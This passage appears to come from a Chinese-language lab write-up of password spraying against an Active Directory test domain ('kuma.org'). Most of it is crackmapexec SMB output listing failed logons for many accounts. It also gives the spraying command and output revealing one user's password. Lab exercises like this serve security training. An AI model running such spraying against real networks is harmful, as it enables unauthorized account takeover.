    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\katharina.alyssa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kiri.kath:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kizzee.margaux:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\krbtgt:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\laurena.mirelle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lazaro.karoly:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lilas.lindy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lily.kristofor:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lina.allene:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\linda.neda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\logan.janeen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lon.sonni:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lorne.celie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lucilia.lelah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\margo.sharl:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\marlyn.loralee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\marney.ranee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\martita.juanita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\marylynne.susannah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\maurizia.ines:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\mercy.edi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\moyra.fanechka:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\nolana.rivy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ollie.dorita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\orelee.peri:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ortensia.fancy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\philippa.eugenie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\philis.gilli:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\pietra.fern:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\randene.lelah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ranee.delinda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\reina.claire:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\renae.babette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\reyna.gwendolyn:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ricca.stefa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ronni.kristoforo:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\rosetta.lotta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ruthann.britta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ruthie.ebony:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\seana.jeanette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\selestina.cassi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\shantee.marylin:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\sherri.jacquetta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\sile.rhiamon:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\sofie.darlleen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\star.rikki:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\stormie.natala:Changeme123! STATUS_LOGON_FAILURE 
    ```
    由於這個密碼的spraying結果沒有像前面兩個這麼明確，只有ella.randee的結果與別人不一樣，我不確定是不是command下錯之類的，但結果只有這樣
    :::
    :::spoiler Result of ncc1701
    ```bash
    crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p ncc1701      
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:ncc1701 STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\aleda.appolonia:ncc1701 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:ncc1701 STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\aleda.appolonia:ncc1701
    ```
    最後結果顯示是aleda.appolonia這個使用者的密碼為ncc1701
    :::